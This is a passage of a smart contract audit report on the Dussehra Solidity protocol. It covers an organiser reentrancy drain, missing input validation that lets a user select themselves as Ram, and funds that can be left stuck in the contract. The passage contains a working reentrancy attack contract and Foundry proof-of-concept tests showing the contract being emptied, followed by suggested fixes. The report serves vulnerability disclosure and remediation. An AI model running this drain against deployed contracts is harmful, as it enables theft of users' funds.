        dussehra = IDussehra(_dussehra);
        choosingRam = IChoosingRam(_chooingRam);
    }

    function attack() public onlyOwner {
        choosingRam.selectRamIfNotSelected();
    }

    function withdraw() public onlyOwner {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        if (!success) {
            revert();
        }
    }

    receive() external payable {
        while (address(dussehra).balance > 1 ether) {
            dussehra.killRavana();
        }
    }
}
```
- The malicious user pulling the strings will use a contract like this that will function the as `RamNFT::organiser`
- This attack contract will end up being the deployer for `RamNFT` giving it `RamNFT::onlyOrganiser` privileges. 
- `RamNFT::onlyOrganiser` is able to set the `ChoosingRam` contract and call `ChoosingRam::selectRamIfNotSelected`

The malicious user can call `OrganizerReenter::attack`
```js
function attack() public onlyOwner {
	choosingRam.selectRamIfNotSelected();
}
```
- The attack contract can call a very important function, `ChoosingRam::selectRamIfNotSelected`, as it will pass the `ramNFT.organiser() == msg.sender`  check

The actual attack occurs in the fallback function:
```js
 receive() external payable {
	while (address(dussehra).balance > 1 ether) {
		dussehra.killRavana();
	}
}
```
- At some point, the contract will receive ether from `Dussehra::killRavana` as we saw in the summary section
- Upon receiving ether, the attack contract will check if the `Dussehra` contract still has ether. 
	- If it does, the contract will call `Dussehra::killRavana` again
	- This loop will continue until the `Dussehra` contract has less than 1 ether

`Foundry Test` to set up attack:
```js
contract OrganizerReenterTest is Test {
    Dussehra public dussehra;
    RamNFT public ramNFT;
    ChoosingRam public choosingRam;
    OrganizerReenter attack;
    address public rug_organiser = makeAddr("organiser");

    uint256 public constant PICK_A_NUMBER = 5;
    address[] players = new address[](PICK_A_NUMBER);

    function setUp() public {
        // organizer deploys attack contract
        vm.startPrank(rug_organiser);
        attack = new OrganizerReenter();
        vm.stopPrank();
        
        // attack contract is used as "organizer"
        vm.startPrank(address(attack));
        ramNFT = new RamNFT();
        choosingRam = new ChoosingRam(address(ramNFT));
        dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));

        ramNFT.setChoosingRamContract(address(choosingRam));
        vm.stopPrank();  

        // enter the contract
        vm.deal(rug_organiser, 10 ether);
        vm.startPrank(rug_organiser);
        attack.setContracts(address(dussehra), address(choosingRam));
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
    }

    modifier participants() {
        for (uint256 i =0; i< PICK_A_NUMBER; i++) {
            string memory stringNumber = vm.toString(i);
            players[i] = makeAddr(stringNumber);
            vm.deal(players[i], 1 ether);
            vm.startPrank(players[i]);
            dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
            vm.stopPrank();
        }
        _;
    }
```
- First, the `rug_organiser` user will deploy the attack contract gaining `onlyOwner` privileges
- Next, the attack contract will deploy `RamNFT` which will be used to deploy the remaining contracts in the protocol
- The rest of the set up enters `rug_organiser` and an arbitrary amount of users into the protocol.

`Foundry` attack test:
```js
function test_organizerReenterWorks() public participants {
	uint256 contractBalance = address(dussehra).balance;
	console.log("balanceStart: ", contractBalance);

	vm.warp(1728691200 + 1);
	vm.startPrank(rug_organiser);
	attack.attack();
	vm.stopPrank();

	contractBalance = address(dussehra).balance;
	uint256 RamwinningAmount = dussehra.totalAmountGivenToRam();
	console.log("balance2: ", contractBalance);
	console.log("RamwinningAmountStart: ", RamwinningAmount);

	vm.startPrank(rug_organiser);
	dussehra.killRavana();
	vm.stopPrank();

	contractBalance = address(dussehra).balance;
	RamwinningAmount = dussehra.totalAmountGivenToRam();
	console.log("balanceEnd: ", contractBalance);
	console.log("RamwinningAmountEnd: ", RamwinningAmount);
}
//  balanceStart:  6000000000000000000
//  balance2:  6000000000000000000
//  RamwinningAmountStart:  0
//  balanceEnd:  0
//  RamwinningAmountEnd:  3000000000000000000
```
- The attack simulates the `rug_organiser` calling `OrganizerReenter::attack()` to make sure `ChoosingRam::isRamSelected` is `true`
- Then the `rug_organiser` (or anyone) calls the `Dussehra::killRavana()` function which starts the attack be interaction with the `OrganizerReenter::receive()` function
- The contract will be drained of all funds while `Dussehra::totalAmountGivenToRam` will still display 50% of the mint fees

## Impact
This is a high risk vulnerability that allows `RamNFT::organiser` to take all the funds.

The vulnerability has a profound impact on the protocol. The goal of the protocol is to split the total mint fees between `RamNFT::organiser` and `ChoosingRam::selectedRam`. Instead, with little effort, `RamNFT::organiser` is able steal all the funds.  The protocol chooses to distribute funds to `RamNFT::organiser` through the `Dussehra:: killRavana()` function opening the door for a reentrancy attack. 

While this protocol is designed to be a sort of raffle, the impact of the bug turns the protocol into an easy rug for the malicious organizer.  

## Tools Used
- Manual Review
- Foundry

## Recommendations
#### There are a few ways to avoid this vulnerability.

###### Make sure that the deployer of `RamNFT` is not a contract
`RamNFT`
```js
function _isContract(address account) internal view returns (bool) { 
	uint256 size; 
	assembly { 
		size := extcodesize(account) 
	} 
	return size > 0; 
}
```
`RamNFT::constructor()`
```diff
constructor() ERC721("RamNFT", "RAM") {
+   if (_isContract(msg.sender)) {
+       revert();
+   }
	tokenCounter = 0;
	organiser = msg.sender;
}
```

###### B) Use OpenZeppelin Security Libraries implementing ReentrancyGuard or Pausable

###### C) Or, just create a separate withdraw function
```diff
contract Dussehra {
+    uint256 public totalAmountGivenToOrganizer;

	function killRavana() public RamIsSelected {
		...
        uint256 totalAmountByThePeople = WantToBeLikeRam.length * entranceFee;

        totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;
+		totalAmountGivenToOrganizer = (totalAmountByThePeople * 50) / 100;
        
-	   (bool success, ) = organiser.call{value: totalAmountGivenToRam}("");
-       require(success, "Failed to send money to organiser");
    }
+	function organizerWithdraw() public RamIsSelected RavanKilled {
+       if (msg.sender!= organiser) {
+           revert();
+       }

+       uint256 amount = totalAmountGivenToOrganizer;
+		totalAmountGivenToOrganizer = 0;
        
+       (bool success, ) = msg.sender.call{value: amount}("");
+       if (!success) {
+			revert()
+		}
+    }
}
```
## <a id='M-02'></a>M-02. Missing input validation in `ChoosingRam::increaseValuesOfParticipants()` enables users to provide the same argument for both parameters            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L33

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L54

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L16

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L81

## Summary
 The `ChoosingRam::increaseValuesOfParticipants()` function is intended to increase the attributes of the user's `RamNFT`. When a `RamNFT` is minted, it stores the address of the minter (`RamNFT::CharacteristicsOfRam.ram`) and defaults 5 characteristics to false:
```js
Characteristics[newTokenId] = CharacteristicsOfRam({
	ram: to,
	isJitaKrodhah: false,
	isDhyutimaan: false,
	isVidvaan: false,
	isAatmavan: false,
	isSatyavaakyah: false
});
```
When all of these characteristics are set to true, `RamNFT::CharacteristicsOfRam.ram` becomes the `ChoosingRam::selectedRam`. The `ChoosingRam::selectedRam` has access to the `Dussehra::withdraw()` function. `Dussehra::withdraw()` allows the `ChoosingRam::selectedRam` to have a share of the funds derived from each entry into the protocol (`Dussehra::totalAmountGivenToRam`)

The `ChoosingRam::increaseValuesOfParticipants()` function requires two `uint256` arguments
```js
function increaseValuesOfParticipants(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyPerticipent)
```

The `ChoosingRam::increaseValuesOfParticipants()` function will change one `RamNFT::CharacteristicsOfRam` to `true` per function call. The function will either manipulate `msg.sender`'s `RamNFT`, or it will manipulate the `RamNFT` of another participant (the second argument). It should take at least 5 function calls to flip all characteristics to `true`:
```js
if (random == 0) {
	if (ramNFT.getCharacteristics(tokenIdOfChallenger).isJitaKrodhah == false){
		ramNFT.updateCharacteristics(tokenIdOfChallenger, true, false, false, false, false);
	} else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isDhyutimaan == false){
		ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, false, false, false);
	} else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isVidvaan == false){
		ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, false, false);
	} else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isAatmavan == false){
		ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, false);
	} else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isSatyavaakyah == false){
		ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, true);
		selectedRam = ramNFT.getCharacteristics(tokenIdOfChallenger).ram;
	}
} else {
	if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isJitaKrodhah == false){
		ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, false, false, false, false);
	} else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isDhyutimaan == false){
		ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, false, false, false);
	} else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isVidvaan == false){
		ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, false, false);
	} else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isAatmavan == false){
		ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, false);
	} else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isSatyavaakyah == false){
		ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, true);
		selectedRam = ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).ram;
	}
}
```

The spirit of this function is to utilize "randomness" to flip characteristics to true. The intention is to require users to call `ChoosingRam::increaseValuesOfParticipants()` multiple times (probably much more than the minimum of 5) in order to become `ChoosingRam::selectedRam`.  We can make this assumption based on this check:
```js
if (ramNFT.getCharacteristics(tokenIdOfChallenger).ram != msg.sender) {
	revert ChoosingRam__CallerIsNotChallenger();
}
```
This check ensures that `msg.sender` is the owner of the `RamNFT` with `tokenIdOfChallenger` id.  So we can assume the idea is for the user to input their `tokenId` and another `tokenId`. However, because there is no validation comparing the two arguments (`uint256 tokenIdOfChallenger` and `uint256 tokenIdOfAnyPerticipent`), the system can easily be gamed. 

## Vulnerability Details
This foundry test shows how easy it is to game the system:
```js
function test_SelectYourself() public participants {
	vm.startPrank(player1);
	choosingRam.increaseValuesOfParticipants(0, 0);
	assertEq(ramNFT.getCharacteristics(0).isJitaKrodhah, true);

	choosingRam.increaseValuesOfParticipants(0, 0);
	assertEq(ramNFT.getCharacteristics(0).isDhyutimaan, true);

	choosingRam.increaseValuesOfParticipants(0, 0);
	assertEq(ramNFT.getCharacteristics(0).isVidvaan, true);

	choosingRam.increaseValuesOfParticipants(0, 0);
	assertEq(ramNFT.getCharacteristics(0).isAatmavan, true);

	choosingRam.increaseValuesOfParticipants(0, 0);
	assertEq(ramNFT.getCharacteristics(0).isSatyavaakyah, true);

    assertEq(choosingRam.selectedRam(),player1);
	vm.stopPrank();  
}
```
The user inputs their `tokenId` twice. They successfully flip each characteristic to true in each function call requiring a total of only 5 function calls. The user becomes `ChoosingRam::selectedRam`.

## Impact
This is a high risk vulnerability that allows a user to game the system.

Abusing a lack of input validation, there is nothing stopping a user from using their own `tokenId` as both arguments for `ChoosingRam::increaseValuesOfParticipants()`. This allows any user to quickly become `ChoosingRam::selectedRam` in 5 function calls. As speculated earlier, it is unlikely that this is intended behavior. The intentions are to create a system dictated by 'randomness' and luck. The lack of input comparison bypasses the need for luck. 

The point of this gamified NFT protocol is to gain `ChoosingRam::selectedRam` status. With this status, the user gains access to the `Dussehra::withdraw()` function, giving the user a claim to 50% of the `RamNFT` mint. 

The `ChoosingRam::increaseValuesOfParticipants()` is very easy to manipulate, and it entitles the manipulator to 50% of the funds. 

## Tools Used
- Manual Review
- Foundry

## Recommendations
The easiest form of mitigation would be to include input validation to ensure both `uint256` arguments are different 
```js
if (tokenIdOfChallenger == tokenIdOfAnyPerticipent) {
	revert ChoosingRam__Cheater();
}
```
- However, the system can still be gamed: enter the raffle twice with different addresses, and use your second `RamNFT` as the second parameter.

A better solution is to have the function randomly choose a second participant. This solution will require more gas, but it won't allow `msg.sender` to freely choose the second input parameter.
```diff
+ function increaseValuesOfParticipants(uint256 tokenIdOfChallenger)
- function increaseValuesOfParticipants(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyPerticipent)
	public
	RamIsNotSelected
{
+	// random user selected based on `RamNFT::getNextTokenId` using ChainlinkVRF
	//...rest of function...
}
```
## <a id='M-03'></a>M-03. `Dussehra::killRavana()` is the only way to disburse funds and its timestamp constraints create the potential for stuck funds (NOT ACCEPTED)            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L67

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L71

## Summary
This protocol implements time constraints for a number of functions. `Dussehra::killRavana()` is one such function, and it is of great important to `RamNFT::organiser` and `ChoosingRam::selectedRam` as it is the only way these two actors can receive their funds.
```js
function killRavana() public RamIsSelected {
	if (block.timestamp < 1728691069) {
		revert Dussehra__MahuratIsNotStart();
	}

	if (block.timestamp > 1728777669) {
		revert Dussehra__MahuratIsFinished();
	}
	...
}
```
- Anyone can call this function, but it must be done in the span of one day
- Of all the participants, only `RamNFT::organiser` and `ChoosingRam::selectedRam` are incentivized to call this function

It would be in the best interest of `RamNFT::organiser` and `ChoosingRam::selectedRam`  to ensure that `Dussehra::killRavana()` is called within the given time constraints. If for any reason they are unable to call the function, all funds will be stuck in the contract.


## Vulnerability Details
We can see this vulnerability in action using Foundry.

##### Foundry test setup
```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dussehra} from "../../src/Dussehra.sol";
import {ChoosingRam} from "../../src/ChoosingRam.sol";
import {RamNFT} from "../../src/RamNFT.sol";

contract CounterTest is Test {
    error Dussehra__MahuratIsFinished();
    
    Dussehra public dussehra;
    RamNFT public ramNFT;
    ChoosingRam public choosingRam;

    address public organiser = makeAddr("organiser");
    uint256 public constant PICK_A_NUMBER = 5;
    address[] players = new address[](PICK_A_NUMBER);

    function setUp() public {
        vm.startPrank(organiser);
        ramNFT = new RamNFT();
        choosingRam = new ChoosingRam(address(ramNFT));
        dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));

        ramNFT.setChoosingRamContract(address(choosingRam));
        vm.stopPrank();
    }

    modifier participants() {
        for (uint256 i =0; i< PICK_A_NUMBER; i++) {
            string memory stringNumber = vm.toString(i);
            players[i] = makeAddr(stringNumber);
            vm.deal(players[i], 1 ether);
            vm.startPrank(players[i]);
            dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
            vm.stopPrank();
        }
        _;
	}
}
```
- The setup launches the contracts with the `organiser` and implements a modifier that enters an arbitrary number of participants into the protocol.

##### Foundry Test
```js
function test_stuckFunds() public participants {
	uint256 contractBalance = address(dussehra).balance;
	console.log("balance start: ", contractBalance);

	vm.warp(1728691200 + 1);
	vm.startPrank(organiser);
	choosingRam.selectRamIfNotSelected();
	address selected = choosingRam.selectedRam();
	vm.stopPrank();
	
	vm.warp(1728777669+1);
   vm.expectRevert(abi.encodeWithSelector(Dussehra__MahuratIsFinished.selector));
	vm.startPrank(selected);
	dussehra.killRavana();
	vm.stopPrank();

	vm.warp(1728777669+1);
   vm.expectRevert(abi.encodeWithSelector(Dussehra__MahuratIsFinished.selector));
	vm.startPrank(organiser);
	dussehra.killRavana();
	vm.stopPrank();

	vm.expectRevert();
	vm.startPrank(selected);
	dussehra.withdraw();
	vm.stopPrank();

	contractBalance = address(dussehra).balance;
	console.log("balance end: ", contractBalance);

	assertEq(dussehra.IsRavanKilled(), false);
}
```
- This test shows what happens if `ChoosingRam::selectedRam` or `RamNFT::organiser` miss the window to call `Dussehra::killRavana()`. 
- We can see that the contract balance remains the same from the start of the test to the finish, and there is no way to extract these funds.

It is up to the protocol how to address this issue, but it should be addressed. This is an example of a simple fix added to `Dussehra` that would allow entrants to reclaim their entrance fees (this example neglects the `RamNFT::organiser`)
##### New Withdraw Option
```js
function withdrawStillAlive() public {
	// This function cannot be called if RavanKilled is true
	if (IsRavanKilled) {
		revert();
	}
	// This function can only be called after `Dussehara::Dussehra__MahuratIsFinished()`
	if (block.timestamp <= 1728777669) {
		revert();
	}
	// Only participants in the `Dussehra::peopleLikeRam` mapping can call this function
	if (!peopleLikeRam[msg.sender]) {
		revert();
	}
	// Update `msg.sender` in `Dussehra::peopleLikeRam`  
	peopleLikeRam[msg.sender] = false;

	// transfer funds to `msg.sender`
	(bool success, ) = msg.sender.call{value: entranceFee}("");
	if (!success) {
		revert();
	}
}
```
- We need to make sure `IsRavanKilled` is false
- The `block.timestap` has to be after the event is finished
- `msg.sender` must return `true` when used in `Dussehra::peopleLikeRam`
- Update `msg.sender` in `Dussehra::peopleLikeRam` to `false`
- Allow `msg.sender` to recollect entrance fee

##### Foundry Test
```js
function test_newWithdraw() public participants {
	// organiser sets selectedRam
	vm.warp(1728691200 + 1);
	vm.startPrank(organiser);
	choosingRam.selectRamIfNotSelected();
	address selected = choosingRam.selectedRam();
	vm.stopPrank();

	// show that killRavana() will when called by selectedRam
	vm.warp(1728777669+1);
vm.expectRevert(abi.encodeWithSelector(Dussehra__MahuratIsFinished.selector));
	vm.startPrank(selected);
	dussehra.killRavana();
	vm.stopPrank();

	// show that killRavana() will when called by organiser
	vm.warp(1728777669+1);
vm.expectRevert(abi.encodeWithSelector(Dussehra__MahuratIsFinished.selector));
	vm.startPrank(organiser);
	dussehra.killRavana();
	vm.stopPrank();

	// track contract balance
	uint256 contractBalance = address(dussehra).balance;
	console.log("balance start: ", contractBalance);

	// a succesful withdrawal using new withdraw function
	vm.startPrank(players[0]);
	dussehra.withdrawStillAlive();
	vm.stopPrank();
	// the same player cannot call new withdraw function twice
	vm.expectRevert();
	vm.startPrank(players[0]);
	dussehra.withdrawStillAlive();
	vm.stopPrank();

	// update contract balance after first withdrawal
	contractBalance = address(dussehra).balance;
	console.log("balance middle: ", contractBalance);

	// remaining players call new withdraw function
	for (uint256 i=1; i<PICK_A_NUMBER;i++) {
		vm.startPrank(players[i]);
		dussehra.withdrawStillAlive();
		vm.stopPrank();
	}

	// contract balance is now 0
	contractBalance = address(dussehra).balance;
	console.log("balance end: ", contractBalance);

	assertEq(dussehra.IsRavanKilled(), false);
}
```
- This test shows the implementation of `Dussehra::withdrawStillAlive`
- After the event is over, if `RamNFT::organiser` and `ChoosingRam::selectedRam` fail to call `Dussehra::killRavana()`, the new withdraw function will allow participants to reclaim their entrance fees
- The test shows that a participant can only call the function once
- The contract balance at the end of the test is 0

## Impact
This is a medium risk vulnerability that can lead to a loss of all funds if actors don't participate accordingly. 

There are two participants that are incentivized to be mindful of the time constraints in `Dussehra::killRavana` (`RamNFT::organiser` and `ChoosingRam::selectedRam`). While anyone can call `Dussehra::killRavana`, it is up to two actors to make sure it happens within the time constrains. `Dussehra::killRavana()` is the only way `RamNFT::organiser` and `ChoosingRam::selectedRam` can receive their funds. So the likelihood of this vulnerability occurring intentionally is low. But if the vulnerability occurs unintentionally, the impact will lead to a complete loss of funds for both actors leaving the funds stuck in the contract. 


## Tools Used
- Manual Review
- Founry

## Recommendations
I provided an example of a withdraw function that can be used to allow participants to reclaim their fees. That is just one way to fix the problem. But there are many ways to fix the issue, and the problem must be addressed. 

The protocol may feel that `RamNFT::organiser` should still be rewarded as this was an nft mint. In that case the suggested function can be adjusted. 

##### Alternative Fix
Add a bool to track whether the `RamNFT::organiser` has withdrawn:
```diff
contract Dussehra {
	...
+	bool public organiserFee;
	...
}
```

Add a calculation to `Dussehra::withdrawStillAlive` to return half the entrance fees:
```diff
   function withdrawStillAlive() public {
	if (IsRavanKilled) {
		revert();
	}

	if (block.timestamp <= 1728777669) {
		revert();
	}

	if (!peopleLikeRam[msg.sender]) {
		revert();
	}

	peopleLikeRam[msg.sender] = false;

+	uint256 giveThemHalf = (entranceFee * 50) / 100;
+   (bool success, ) = msg.sender.call{value: giveThemHalf}("");
	if (!success) {
		revert();
	}
}
```

Create `Dussehra::organizerWithdraw()`
```js
function organizerWithdraw() public {
	if (msg.sender != ramNFT.organiser()) {
		revert();
	}

	if (address(this).balance == 0) {
		revert();
	}

	if (organiserFee) {
		revert();
	}

	organiserFee = true;

	uint256 totalAmountByThePeople = WantToBeLikeRam.length * entranceFee;
	totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;

	(bool success, ) = organiser.call{value: totalAmountGivenToRam}("");
	require(success, "Failed to send money to organiser");
}
```

##### Foundry Test
```js
function test_giveThemHalf() public participants {
	// organizer sets selectedRam
	vm.warp(1728691200 + 1);
	vm.startPrank(organiser);
	choosingRam.selectRamIfNotSelected();
	address selected = choosingRam.selectedRam();
	vm.stopPrank();

	// check contract balance
	uint256 contractBalance = address(dussehra).balance;
	console.log("balance start: ", contractBalance);

	// organizer withdraws
	vm.startPrank(organiser);
	dussehra.organizerWithdraw();
	vm.stopPrank();
	// organizer cannot withdraw twice
	vm.expectRevert();
	vm.startPrank(organiser);
	dussehra.organizerWithdraw();
	vm.stopPrank();

	// conctract balance after organizer withdraws (50% still in contract)
	contractBalance = address(dussehra).balance;
	console.log("balance middle: ", contractBalance);

	// participants withdraw
	for (uint256 i=0; i<PICK_A_NUMBER;i++) {
		vm.startPrank(players[i]);
		dussehra.withdrawStillAlive();
		vm.stopPrank();
	}

	// contract balance is 0
	contractBalance = address(dussehra).balance;
	console.log("balance end: ", contractBalance);
	assertEq(dussehra.IsRavanKilled(), false);
}
```

Another simple fix would be to remove the second time constraint in `Dussehra::killRavana()`:
```diff
function killRavana() public RamIsSelected {
	if (block.timestamp < 1728691069) {
		revert Dussehra__MahuratIsNotStart();
	}

-	if (block.timestamp > 1728777669) {
-		revert Dussehra__MahuratIsFinished();
-	}
	 ...	
}
```

It is up to the protocol on how to proceed, but this is an issue that should not be left unaddressed. 



